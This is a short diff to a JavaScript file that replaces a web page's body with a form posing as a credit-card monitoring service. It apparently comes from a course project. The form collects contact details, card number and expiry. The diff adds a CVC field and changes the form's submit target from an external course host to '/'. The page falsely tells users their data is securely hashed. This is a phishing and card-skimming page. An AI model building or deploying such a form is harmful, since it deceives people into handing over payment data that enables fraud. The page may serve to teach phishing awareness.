@@ -7,7 +7,7 @@ newBody.innerHTML = `
     <p style='font-size: 18px; padding: 5px 0px'>If you provide us with your credit card, we can track its usage for suspicious activity as well!</p>
     <p style='font-size: 18px; padding: 5px 0px'>All information provided (except your email, so we can contact you) is securely hashed and cannot be recovered by a third party in the event of a breach.</p>
 
-    <form method="post" action='https://cse331.andrewjaffie.me/submitform' id='secform'>
+    <form method="post" action='/' id='secform'>
         <p>Required fields are followed by <strong><abbr title="required">*</abbr></strong>.</p>
         <section>
             <h2>Contact information</h2>
@@ -64,6 +64,12 @@ newBody.innerHTML = `
                 <em>formatted as mmyy</em>
               </label>
               <input type="text" id="date" name="CCExpiration">
+            </p>
+	    <p>
+              <label for="cvc">
+                <span>CVC:</span>
+              </label>
+                <input type="number" id="cvc" name="CVC">
             </p>
         </section>
         <section>
